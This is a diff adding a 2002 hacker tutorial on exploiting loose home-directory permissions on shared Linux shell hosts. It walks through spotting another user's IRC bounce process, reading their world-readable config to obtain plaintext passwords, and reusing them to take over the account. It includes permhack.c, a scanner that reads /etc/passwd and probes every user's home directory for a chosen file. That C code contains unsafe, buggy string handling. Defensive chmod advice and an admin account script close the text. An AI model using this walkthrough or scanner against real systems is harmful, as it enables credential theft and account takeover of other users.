@@ -1,0 +1,417 @@
+
+   ___________    ____________    ____  __  ___    ______________
+  |\    ____  \  |\    ____   \  |\   \|\ \|\  \  |\_____    ____\
+  | \   \__|\  \ | \   \__|\   \ | \   \ \ \ \  \ | |   |\   \   |
+  \  \    ___   | \ \    ____   \ \ \   \_| \_|  \ \|___| \   \__|
+   \  \   \_|\  \_ \ \   \__|\   \ \ \      _     \      \ \   \
+    \  \   \\ \   \ \ \   \ \ \   \ \ \     |\ http://www.haxworx.com
+     \  \___\\ \___\ \ \___\ \ \___\ \ \____| \_____\      \ \___\
+      \ |   | \ |   | \ |   | \ |   | \ |   |\ |    |       \ |   |
+       \|___|  \|___|  \|___|  \|___|  \|___| \|____|        \|___|
+ 
+ +-----------------------------------------------------------------------+
+ |  Shell Misconfiguration Hacking (Understanding File Permissions)      |
+ |  Author: BrainRawt                                                    |
+ |  Email: brainrawt@hotmail.com                                         |
+ |  Site: http://www.haxworx.com                                         |
+ |  Greetz to grep and b0iler.                                           |
+ +-----------------------------------------------------------------------+
+
+ Updated on 5-11-02
+ 
+ NOTE: This text will talk about logging into a shell via telnet/ssh but
+       it must be known that with the proper cgi script, you can do all 
+       this hacking via a web-browser as well.
+
+ A Word from BrainRawt.......
+
+ Many people will get a shell account and not understand the security 
+ that is involved in using it.  In my past experiences, I have found
+ many /home/username dirs that offer alot of information. Information
+ that Im sure they dont think is available to me.  In this text we will
+ use a "bounce" as an example.  Keep in mind that many things require
+ config files with passwds in them. :)
+
+ ------------------------------------------
+ Whats the Problem?
+ ------------------------------------------
+ Most /home/username dirs have the 755 permissions.  This means that anyone
+ can read/execute from within the /home/username dir. I can understand a
+ user wanting these permissions on their "$HOME" dir if they are using their
+ public_html dir to offer a webpage to the public.  If this is the case then
+ the user must take other precautions to allow access to the /home/username/public_html
+ without allowing access to everything else in the /home/username dir.
+
+ ------------------------------------------
+ Why is This a Problem?
+ ------------------------------------------
+ Lets say that we are logged into our shell and we have just performed a
+ "ps aux | grep bnc".  This will search the system for running processes 
+ and echo back to us any information it finds on "bnc".
+
+ [rawt@linux rawt]$ ps aux | grep bnc     ( NOTE: we can grep for anything. )
+
+ lamah-joe    1059  0.0  0.2  1460  656 ?        S    Jun30   0:02 ./bnc
+
+ [rawt@linux rawt]$
+
+ Now we know that lamah-joe is running a ./bnc (bounce).  Why do we care? We care
+ because most bounces require a password to be used.  That password must be in a 
+ config file for the bounce.  :)
+
+ Now we check lamah-joes home dir for permissions.
+
+ [rawt@linux rawt]$ ls -alk /home | grep lamah-joe
+
+ drwxr-xr-x    8 lamah-joe   lamah-joe       4096 Jun 29 01:28 lamah-joe
+
+ [rawt@linux rawt]$ 
+ 
+ -------------------------------------------
+ Understanding Permissions
+ -------------------------------------------
+ permission      username    groupname
+ drwxr-xr-x    8 lamah-joe   lamah-joe       4096 Jun 29 01:28 lamah-joe
+ 
+ Breaking Down Permissions
+
+ The first rwx are the owner permssions
+ The second r-x are the group permissions
+ The third r-x are the "world" permissions.
+
+ So in our case above, we can see that lamah-joe can "read/write/execute", anyone in the
+ lamah-joe group can "read/execute", and everyone else can "read/execute".
+
+ Everyone else = we the hackers. :)
+
+ -------------------------------------------
+ Performing the Hack
+ -------------------------------------------
+
+ Thanks to the almighty read/execute permissions we have on this users "$HOME" dir, we
+ can just perform an "ls" in their home dir.  HAHA  LAME!
+
+ [rawt@linux /home]$ ls -alk /home/lamah-joe/
+ 
+ drwx------    5 lamah-joe   lamah-joe       4096 Jul  4 09:49 .
+ drwxrwsr-x   62 root        staff           4096 Jun 30 00:00 ..
+ -rw-r--r--    1 lamah-joe   lamah-joe        266 Feb 19 16:53 .alias
+ -rw-------    1 lamah-joe   lamah-joe        319 Jul  4 12:06 .bash_history
+ -rw-r--r--    1 lamah-joe   lamah-joe        134 Feb 19 16:53 .bash_logout
+ -rw-r--r--    1 lamah-joe   lamah-joe        409 Feb 19 16:53 .bash_profile
+ -rw-r--r--    1 lamah-joe   lamah-joe        509 Feb 19 16:53 .bashrc
+ -rw-r--r--    1 lamah-joe   lamah-joe        375 Feb 19 16:53 .cshrc
+ drwx------    2 lamah-joe   lamah-joe       4096 Jul  4 09:49 .ssh
+ -rw-r--r--    1 lamah-joe   lamah-joe     121323 Jun 19 04:46 nbtscan-1.0.2.tar.gz
+ -rw-r--r--    1 lamah-joe   lamah-joe     584385 Jun 19 04:42 nmap-2.53.tgz
+ drwx---r-x    5 lamah-joe   lamah-joe       4096 Jun 23 22:57 nmap
+ drwxr-xr-x    5 lamah-joe   lamah-joe       5132 Jun 27 06:19 bounce
+ 
+ [rawt@linux /home]$
+ 
+ -----------------------------------------------------------------------------------------------
+ What if the users home dir only allows me to execute and i cant view the contents in his/her
+ home dir?  How am i going to find what i need? If this is the case then i suggest that you
+ either know exactly what you are looking for or you use the "locate" command.  HINT: If the   
+ /home/username only allows you execution and not read, it doesnt mean that the dirs inside the  
+ /home/username have the same permissions.
+ -----------------------------------------------------------------------------------------------  
+
+ We found that almighty wonderful "bounce" dir and it is world "read/execute" :).  Now for the   
+ configuration file within it.
+
+ [rawt@linux /home]$ ls -alk /home/lamah-joe/bounce/ | grep bnc.conf
+ 
+ -rw-r--r--    1 lamah-joe   lamah-joe        375 Feb 19 16:53 bnc.conf
+
+ [rawt@linux /home]$
+
+ How nice of lamah-joe to leave his bnc.conf file world readable.  :)  Lets get that bnc passwd. Now
+ we view this bnc.conf file with our favorite unix editor. In my case its "pico".
+
+ [rawt@linux /home]$ pico bnc.conf
+
+ Inside bnc.conf i found 2 lines.......
+
+ S:james123j                Password for Supervisor Access
+ D:1337:5:6ji5hf            ListenPort:MaxUsers:Password
+
+ Sometimes these passwds are encrypted.  Dont worry.  Its only DES. 
+ You can decipher them with "John The Ripper".  
+
+ --------------------------------------------
+ lamah-joe has been 0wn3d!
+ --------------------------------------------
+
+ What have i gained from this users lack of linux permission knowledge?
+
+ I have gained a free bounce on lamahshell.com.
+
+ I have checked further and discovered that lamah-joe uses the same pass
+ for his shell.
+
+ Soooooo!!!!  What have i gained now?
+
+ A free bnc on lamah.com
+ and
+ A free shell on lamah.com
+
+ ---------------------------------------------------------------
+ What Do We Do With This Information?
+ ---------------------------------------------------------------
+ 
+ We could use this new found information for malicious reasons.  We could
+ use his bounce and not tell him or maybe even hack from his shell.  I suggest
+ that we fix all lamah-joes permissions and then tell him what has happened.  This
+ is our way of spreading this knowledge to those that need to know.  We had fun
+ exploring and lamah-joe learns a lesson. 
+
+
+ ---------------------------------------------------
+ How Do We Protect Ourselves Against This?
+ ---------------------------------------------------
+
+ 1. Study File Permissions, how to use them and what they mean.
+ 
+ 2. Learn how to use "chmod".  Type "man chmod" at a linux command prompt.
+    (chmod is used to set file permissions.)
+
+ 3. I personally dont use the public_html in my shell accounts so i have a
+    tendency to "chmod 700 /home/myusername".  This allows only myself 
+    to enter my home dir.
+
+ 4. Always use encrypted and nondictionary passwds when available.  Some kiddies 
+    may gain the ability to read your conf files but not all of them know how to 
+    decipher encryption.
+
+
+ --------------------------------------------------------------------------
+ Here is a small "Exploit" to automate the searching of directories that
+ are vulnerable to improper file permissions.
+ --------------------------------------------------------------------------
+
+ ------------ START COPY OF permhack.c ----------------
+
+/*
+ *
+ * permhack.c By BrainRawt (Understanding The Importance Of File Permissions)
+ * Email: brainrawt@hotmail.com
+ * Site: http://rawt.daemon.sh
+ *
+ * Note: This source was coded as a proof of concept to those people that
+ *       dont think file permissions are important. I know that this could 
+ *       have been done alot easier in perl or shell script but I was wanting 
+ *       to learn c so I thought that this would be a good start in my humble c beginning.
+ *
+ * The "passwd" path and the "/home/user" path may need modified for different
+ * hosts or dif distros of linux.
+ *
+ *
+ * usage: permhack <look4> <logfile>
+ *
+ *
+ * Greetz to Soltan^Gris and Netstar for thier great help on this project. 
+ */
+
+
+#include <stdio.h>
+#include <string.h>
+
+
+int main(int argc, char *argv[])
+  {
+
+   
+   FILE *passwd_file, *username_file, *log_file, *checkfile,*fopen ();
+   int c, x,count;
+   char *output_file;
+   char * look4;
+   char buffer[256];
+   char buffer2[256];
+     if (argc != 3) 
+     { 
+      printf("usage: %s: <look4> <logfile>\n", argv[0]);
+      exit(1);
+     }
+   
+   
+   passwd_file = fopen ( "/etc/passwd", "r");
+  
+   if ( passwd_file == NULL )
+ 
+       printf("\nSHIT! /etc/passwd either isnt there or we just cant read it.\n\n");
+
+   else { 
+
+     username_file = fopen ("usernames", "w");
+       
+     if ( username_file == NULL ) 
+       
+       printf("\nSHIT! Cant write my extracted usernames from /etc/passwd to ~/usernames?\n\n");
+
+     else {
+
+ 
+     int colon=0;
+       while ( ( c = getc( passwd_file)) != EOF )
+          {
+          if(c==58)
+          colon=1;
+          if(c==10)
+          colon=0;
+          if(colon==0)
+          putc (c, username_file);
+ 
+          }
+       fclose (username_file);
+   
+      
+         look4 = argv[1];
+         output_file = argv[2];
+       
+  
+	
+       username_file = fopen ("usernames", "r");
+       
+       if (username_file == NULL )
+	 printf("\nCannot open usernames for reading\n\n");
+
+       else {    
+  
+       log_file = fopen (output_file, "w"); 
+       printf("looking for [%s] in the /home/user dirs and logging to [%s]\n\n", look4, output_file);
+     
+       
+       count =0;
+       while (( x = getc( username_file )) != EOF )      
+            { 
+             if ( x != '\n')
+              {
+               buffer2[count] = x;
+               count++;
+ 
+              }
+
+              if(x == '\n')
+               {
+               sprintf(buffer,"/home/",buffer);
+               sprintf(buffer,"%s%s/%s",buffer,buffer2,look4);
+               count =0;
+               checkfile = fopen(buffer,"r");
+               if(checkfile != NULL)
+                 {
+                 printf("Found - %s\n",buffer);
+                 fprintf(log_file," %s\n",buffer);
+                 fclose(checkfile);
+                 }  
+              
+               memset(buffer2,0,sizeof(buffer2));
+               }
+
+        }
+       }
+       
+     } 
+     printf("\n");
+     fclose (passwd_file);
+     fclose (username_file);
+     fclose (log_file);
+   }
+   return (0);
+  } 
+
+
+
+ ------------- END COPY OF permhack.c -----------------
+
+
+ --------------------------------------------------------------------------
+ Here is a small shell script i wrote for an admin to use when creating
+ a new account.  This will hopefully solve the problem discussed above.
+ --------------------------------------------------------------------------
+
+ ------------ START COPY OF newuser-----------------
+
+#!/bin/sh
+#
+# My very quick and simple ass way to solving the insecure 
+# permission problems for users on a shell.  We will protect
+# their data in /home/username/bin via 700 and still allow access
+# to ~/public_html via 755 so the webspace can still be used.  To protect
+# from those snooping eyes that belong to other users on the system,
+# we will chmod 711 the /home/username dir. This will stop anyone from
+# viewing its contents. If you dont like this script then dont use it.  :P
+#
+# - BrainRawt (http://rawt.daemon.sh) (brainrawt@hotmail.com)
+
+echo "What is the username of the account you wish to create?"
+read LUSER
+echo "Now creating account for $LUSER"
+useradd $LUSER
+if [ -d /home/$LUSER ];
+ then
+   chmod 711 /home/$LUSER
+   mkdir /home/$LUSER/bin
+   mkdir /home/$LUSER/public_html
+ else
+   echo "Where is the /home/$LUSER dir?"
+fi
+
+if [ -d /home/$LUSER/bin ];
+ then
+   chmod 700 /home/$LUSER/bin
+   chown $LUSER:$LUSER /home/$LUSER/bin
+  else 
+   echo" Where is the /home/$LUSER/bin die?"
+fi
+
+if [ -d /home/$LUSER/public_html ];
+  then
+    chmod 755 /home/$LUSER/public_html
+    chown $LUSER:$LUSER /home/$LUSER/public_html  
+  else
+    echo "Where is the /home/$LUSER/public_html?"
+fi
+
+echo "Account for $LUSER has been successfully created."
+passwd $LUSER
+
+cat > /home/$LUSER/README <<- _EOF_
+
+
+      ATT: All users on this system can view any content
+      that you place in your /home/YOURNAME dir.  Please be safe
+      and use your /home/YOURNAME/bin dir to store files that you
+      wish to keep private.  
+
+      Thank You,
+      Administration
+
+
+_EOF_
+
+
+ --------------- END COPY OF newuser-----------------
+
+
+
+ --------------------------------------------------------------------------
+ Which Looks Better?  BlackHat or White?  You Decide! - BrainRawt
+ 
+ 
+ 
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+ 
+ 
+ 
+ 
+   
